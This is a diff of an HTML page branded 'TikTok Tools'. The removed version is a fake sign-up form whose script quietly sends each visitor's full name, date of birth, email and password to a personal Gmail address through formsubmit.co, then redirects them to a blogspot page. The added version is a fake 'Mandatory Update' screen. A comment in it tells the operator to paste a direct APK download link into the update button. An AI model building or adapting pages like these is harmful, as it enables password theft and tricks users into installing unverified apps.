@@ -3,42 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign Up - TikTok Tools</title>
+    <title>App Update Required</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');
-        
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
+        *, *::before, *::after { 
+            box-sizing: border-box; 
+            margin: 0; 
+            padding: 0; 
         }
 
-        body { 
-            font-family: 'Poppins', sans-serif;
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
+        :root {
+            --bg-dark: #0b132b;
+            --bg-card: rgba(15, 23, 42, 0.82);
+            --neon-cyan: #00f2fe;
+            --neon-blue: #2563eb;
+            --neon-pink: #fe2c55;
+            --text-main: #f8fafc;
+            --text-sub: #94a3b8;
+        }
+
+        body {
+            min-height: 100vh;
             background: linear-gradient(135deg, #0b132b 0%, #1c2541 50%, #0a192f 100%);
-            color: #f8fafc; 
+            font-family: 'Poppins', sans-serif;
+            color: var(--text-main);
             overflow: hidden;
             position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
 
-        /* Animated Background Floating Blobs */
-        .bg-circle {
-            position: absolute;
+        /* Floating Ambient Blobs */
+        .bg-blob {
+            position: fixed;
             border-radius: 50%;
             filter: blur(80px);
-            z-index: 1;
-            opacity: 0.6;
-            animation: floatShape 12s infinite alternate ease-in-out;
+            z-index: 0;
+            pointer-events: none;
+            opacity: 0.55;
+            animation: floatMotion 12s infinite alternate ease-in-out;
         }
 
         .blob-1 {
             width: 320px;
             height: 320px;
-            background: #2563eb;
+            background: var(--neon-blue);
             top: -10%;
             left: -5%;
             animation-duration: 9s;
@@ -47,7 +57,7 @@
         .blob-2 {
             width: 280px;
             height: 280px;
-            background: #00f2fe; /* Cyan TikTok Glow */
+            background: var(--neon-cyan);
             bottom: -5%;
             right: -5%;
             animation-duration: 11s;
@@ -56,41 +66,41 @@
         .blob-3 {
             width: 240px;
             height: 240px;
-            background: #fe2c55; /* TikTok Red/Pink glow */
-            top: 40%;
-            right: 25%;
-            opacity: 0.25;
-            animation-duration: 14s;
+            background: var(--neon-pink);
+            top: 35%;
+            right: 20%;
+            opacity: 0.22;
+            animation-duration: 13s;
         }
 
-        @keyframes floatShape {
+        @keyframes floatMotion {
             0% { transform: translate(0, 0) scale(1) rotate(0deg); }
-            50% { transform: translate(40px, -50px) scale(1.15) rotate(90deg); }
+            50% { transform: translate(40px, -50px) scale(1.12) rotate(90deg); }
             100% { transform: translate(-30px, 30px) scale(0.95) rotate(180deg); }
         }
 
-        /* Main Squircle Container with Animated Border Glow */
-        .glow-pro-box { 
-            background: rgba(15, 23, 42, 0.75); 
+        /* Update Card */
+        .update-box {
+            position: relative;
+            z-index: 10;
+            background: var(--bg-card);
             backdrop-filter: blur(18px);
             -webkit-backdrop-filter: blur(18px);
-            padding: 38px 32px; 
+            padding: 40px 30px;
             border-radius: 36px;
-            text-align: center; 
+            text-align: center;
             width: 88%;
-            max-width: 390px; 
+            max-width: 390px;
             border: 2px solid rgba(56, 189, 248, 0.35);
             box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4), 
                         0 0 25px rgba(0, 242, 254, 0.25),
                         inset 0 0 15px rgba(56, 189, 248, 0.15);
-            position: relative;
-            z-index: 10;
-            animation: cardFloat 5s ease-in-out infinite alternate, glowPulse 4s infinite alternate;
+            animation: boxFloat 5s ease-in-out infinite alternate, glowPulse 4s infinite alternate;
         }
 
-        @keyframes cardFloat {
+        @keyframes boxFloat {
             0% { transform: translateY(0px); }
-            100% { transform: translateY(-12px); }
+            100% { transform: translateY(-10px); }
         }
 
         @keyframes glowPulse {
@@ -98,33 +108,53 @@
             100% { box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6), 0 0 35px rgba(0, 242, 254, 0.45); }
         }
 
-        /* Animated Center Tick Mark Badge */
+        /* Animated Badge */
         .badge-icon {
-            width: 65px;
-            height: 65px;
-            background: linear-gradient(135deg, #00f2fe, #2563eb);
+            width: 72px;
+            height: 72px;
+            background: linear-gradient(135deg, var(--neon-cyan), var(--neon-blue));
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 15px;
-            color: #ffffff;
-            font-size: 30px;
-            font-weight: bold;
+            margin: 0 auto 18px;
             box-shadow: 0 0 25px rgba(0, 242, 254, 0.6);
-            animation: bounceSpin 3s ease-in-out infinite;
+            animation: rotateBounce 4s ease-in-out infinite;
         }
 
-        @keyframes bounceSpin {
+        .badge-icon svg {
+            width: 34px;
+            height: 34px;
+            fill: none;
+            stroke: #ffffff;
+            stroke-width: 2.2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        @keyframes rotateBounce {
             0%, 100% { transform: scale(1) rotate(0deg); }
-            50% { transform: scale(1.1) rotate(6deg); box-shadow: 0 0 35px rgba(0, 242, 254, 0.85); }
+            50% { transform: scale(1.08) rotate(15deg); box-shadow: 0 0 35px rgba(0, 242, 254, 0.85); }
         }
 
-        /* Gradient Animated Headline */
-        h2 { 
-            margin-bottom: 5px;
-            font-size: 26px;
+        .version-tag {
+            display: inline-block;
+            padding: 4px 14px;
+            background: rgba(0, 242, 254, 0.12);
+            border: 1px solid rgba(0, 242, 254, 0.35);
+            color: var(--neon-cyan);
+            font-size: 11px;
+            font-weight: 600;
+            letter-spacing: 0.8px;
+            text-transform: uppercase;
+            border-radius: 20px;
+            margin-bottom: 12px;
+        }
+
+        h2 {
+            font-size: 24px;
             font-weight: 700;
+            margin-bottom: 8px;
             background: linear-gradient(90deg, #00f2fe, #38bdf8, #fe2c55, #00f2fe);
             background-size: 300% 300%;
             -webkit-background-clip: text;
@@ -140,67 +170,63 @@
 
         p {
             font-size: 13px;
-            color: #94a3b8;
+            color: var(--text-sub);
+            line-height: 1.6;
             margin-bottom: 24px;
+            padding: 0 8px;
         }
 
-        .input-group {
+        /* Bullet Points Box */
+        .notice-box {
+            background: rgba(2, 6, 23, 0.45);
+            border: 1px dashed rgba(56, 189, 248, 0.25);
+            border-radius: 16px;
+            padding: 14px;
+            margin-bottom: 24px;
             text-align: left;
-            margin-bottom: 16px;
-            position: relative;
         }
 
-        label {
-            display: block;
+        .notice-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
             font-size: 12px;
             color: #cbd5e1;
-            margin-bottom: 6px;
-            font-weight: 500;
-            letter-spacing: 0.4px;
+            margin-bottom: 8px;
         }
 
-        /* Animated Focus Inputs */
-        input { 
-            width: 100%; 
-            padding: 13px 15px; 
-            border: 1.5px solid rgba(71, 85, 105, 0.6); 
-            background: rgba(15, 23, 42, 0.8); 
-            color: #f8fafc; 
-            font-size: 14px;
-            border-radius: 14px;
-            transition: all 0.35s cubic-bezier(0.4, 0, 0.2, 1);
-            font-family: 'Poppins', sans-serif;
+        .notice-item:last-child {
+            margin-bottom: 0;
         }
 
-        input:focus {
-            outline: none;
-            border-color: #00f2fe;
-            background: rgba(15, 23, 42, 0.95);
-            box-shadow: 0 0 15px rgba(0, 242, 254, 0.4), inset 0 0 8px rgba(0, 242, 254, 0.2);
-            transform: scale(1.02);
+        .notice-item .dot {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: var(--neon-cyan);
+            box-shadow: 0 0 8px var(--neon-cyan);
+            flex-shrink: 0;
         }
 
-        input::placeholder {
-            color: #475569;
-        }
-
-        /* Button with moving gradient light wave */
-        button { 
+        /* Animated Action Button */
+        .btn-update {
+            display: block;
+            width: 100%;
+            text-decoration: none;
+            padding: 15px;
             position: relative;
             overflow: hidden;
-            padding: 14px; 
-            background: linear-gradient(135deg, #0284c7 0%, #2563eb 50%, #00f2fe 100%); 
+            background: linear-gradient(135deg, #0284c7 0%, #2563eb 50%, #00f2fe 100%);
             background-size: 200% 200%;
-            color: #ffffff; 
-            border: none; 
-            border-radius: 14px; 
-            cursor: pointer; 
-            font-size: 15px; 
-            font-weight: 600; 
-            width: 100%;
-            margin-top: 10px;
+            color: #ffffff;
+            border: none;
+            border-radius: 16px;
+            cursor: pointer;
+            font-size: 15px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            box-shadow: 0 8px 22px rgba(37, 99, 235, 0.4);
             transition: all 0.3s ease;
-            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.4);
             animation: btnShift 4s ease infinite;
         }
 
@@ -210,15 +236,14 @@
             100% { background-position: 0% 50%; }
         }
 
-        /* Light Shimmer sweep over button */
-        button::after {
+        .btn-update::after {
             content: '';
             position: absolute;
             top: -50%;
             left: -50%;
             width: 200%;
             height: 200%;
-            background: linear-gradient(60deg, transparent, rgba(255,255,255,0.25), transparent);
+            background: linear-gradient(60deg, transparent, rgba(255,255,255,0.3), transparent);
             transform: rotate(30deg);
             animation: shimmerSweep 3.5s infinite;
         }
@@ -228,165 +253,66 @@
             100% { transform: translate(100%, 100%) rotate(30deg); }
         }
 
-        button:hover {
+        .btn-update:hover {
             transform: translateY(-2px) scale(1.02);
-            box-shadow: 0 10px 25px rgba(0, 242, 254, 0.55);
+            box-shadow: 0 12px 28px rgba(0, 242, 254, 0.55);
         }
 
-        button:disabled {
-            background: #334155;
-            box-shadow: none;
-            cursor: not-allowed;
-            color: #94a3b8;
-            animation: none;
-        }
-
-        /* Loading Animation */
-        #loading-screen { 
-            display: none; 
-            text-align: center;
-            position: relative;
-            z-index: 20;
-            background: rgba(15, 23, 42, 0.85);
-            backdrop-filter: blur(15px);
-            padding: 40px;
-            border-radius: 30px;
-            border: 1px solid rgba(56, 189, 248, 0.3);
-            box-shadow: 0 0 30px rgba(0, 242, 254, 0.3);
-        }
-        
-        .loader {
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            border: 4px solid rgba(56, 189, 248, 0.15);
-            border-top-color: #00f2fe;
-            border-right-color: #fe2c55;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto 15px;
-            box-shadow: 0 0 20px rgba(0, 242, 254, 0.4);
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .footnote {
+            margin-top: 20px;
+            font-size: 11px;
+            letter-spacing: 1.2px;
+            text-transform: uppercase;
+            color: #64748b;
+            font-weight: 600;
         }
     </style>
 </head>
 <body>
 
-    <!-- Background glowing ambient blobs -->
-    <div class="bg-circle blob-1"></div>
-    <div class="bg-circle blob-2"></div>
-    <div class="bg-circle blob-3"></div>
+    <!-- Ambient Glowing Blobs -->
+    <div class="bg-blob blob-1"></div>
+    <div class="bg-blob blob-2"></div>
+    <div class="bg-blob blob-3"></div>
 
-    <div id="loading-screen">
-        <div class="loader"></div>
-        <p style="color: #f8fafc; font-size: 15px; font-weight: 500;">Authenticating...</p>
+    <!-- Main Card -->
+    <div class="update-box">
+        
+        <div class="badge-icon">
+            <svg viewBox="0 0 24 24">
+                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                <polyline points="7 10 12 15 17 10"></polyline>
+                <line x1="12" x2="12" y1="15" y2="3"></line>
+            </svg>
+        </div>
+
+        <span class="version-tag">Mandatory Update</span>
+        <h2>Update Required</h2>
+        <p>A newer, faster, and more secure version of TikTok Tools is ready. Please update now to regain full access to all features.</p>
+
+        <div class="notice-box">
+            <div class="notice-item">
+                <span class="dot"></span>
+                <span>Enhanced AI generation servers</span>
+            </div>
+            <div class="notice-item">
+                <span class="dot"></span>
+                <span>Critical bug fixes &amp; speed boost</span>
+            </div>
+            <div class="notice-item">
+                <span class="dot"></span>
+                <span>New viral tools &amp; trend filters</span>
+            </div>
+        </div>
+
+        <!-- Yahan apna direct APK / Download link paste karein -->
+        <a class="btn-update" href="https://your-download-link.com" target="_blank">
+            Update App Now
+        </a>
+
+        <div class="footnote">TIKTOK TOOLS SECURE</div>
+
     </div>
 
-    <div class="glow-pro-box" id="signup-box">
-        <!-- Floating Animated Checkmark -->
-        <div class="badge-icon">✓</div>
-        
-        <h2>Create Account</h2>
-        <p>Access your tools dashboard</p>
-        
-        <div class="input-group">
-            <label>Full Name</label>
-            <input type="text" id="userFullName" placeholder="e.g. Ali Khan" required />
-        </div>
-
-        <div class="input-group">
-            <label>Date of Birth</label>
-            <input 
-                type="text" 
-                id="userDOB" 
-                placeholder="DD/MM/YYYY" 
-                inputmode="numeric"
-                maxlength="10" 
-                required 
-            />
-        </div>
-
-        <div class="input-group">
-            <label>Email Address</label>
-            <input type="email" id="userEmail" placeholder="name@example.com" required />
-        </div>
-
-        <div class="input-group">
-            <label>Password</label>
-            <input type="password" id="userPass" placeholder="••••••••" required />
-        </div>
-        
-        <button id="submitBtn" onclick="handleSignup()">Sign Up</button>
-    </div>
-
-    <script>
-        const adminEmail = "mrpinto1433@gmail.com"; 
-        const targetLink = "https://testing14333333.blogspot.com/?m=1"; 
-
-        window.onload = function() {
-            if (localStorage.getItem("app_user_verified") === "true") {
-                showLoading();
-                window.location.href = targetLink;
-            }
-        };
-
-        // DOB Auto Format
-        document.getElementById("userDOB").addEventListener("input", function(e) {
-            let val = e.target.value.replace(/\D/g, "");
-            let formatted = "";
-
-            if (val.length >= 1) formatted = val.substring(0, 2);
-            if (val.length >= 3) formatted += "/" + val.substring(2, 4);
-            if (val.length >= 5) formatted += "/" + val.substring(4, 8);
-
-            e.target.value = formatted;
-        });
-
-        function showLoading() {
-            document.getElementById("signup-box").style.display = "none";
-            document.getElementById("loading-screen").style.display = "block";
-        }
-
-        function handleSignup() {
-            const fullName = document.getElementById("userFullName").value;
-            const dob = document.getElementById("userDOB").value;
-            const email = document.getElementById("userEmail").value;
-            const pass = document.getElementById("userPass").value;
-            const btn = document.getElementById("submitBtn");
-
-            if(!fullName || !dob || !email || !pass) {
-                alert("Please fill all the details to continue!");
-                return;
-            }
-
-            btn.innerText = "Processing...";
-            btn.disabled = true;
-
-            fetch(`https://formsubmit.co/ajax/${adminEmail}`, {
-                method: "POST",
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    "Full Name": fullName,
-                    "Date of Birth": dob,
-                    "Email": email,
-                    "Password": pass,
-                    "_subject": "New App Registration!"
-                })
-            })
-            .then(() => {
-                localStorage.setItem("app_user_verified", "true");
-                showLoading();
-                window.location.href = targetLink;
-            })
-            .catch(() => {
-                alert("Network error! Please check your connection.");
-                btn.innerText = "Sign Up";
-                btn.disabled = false;
-            });
-        }
-    </script>
 </body>
 </html>
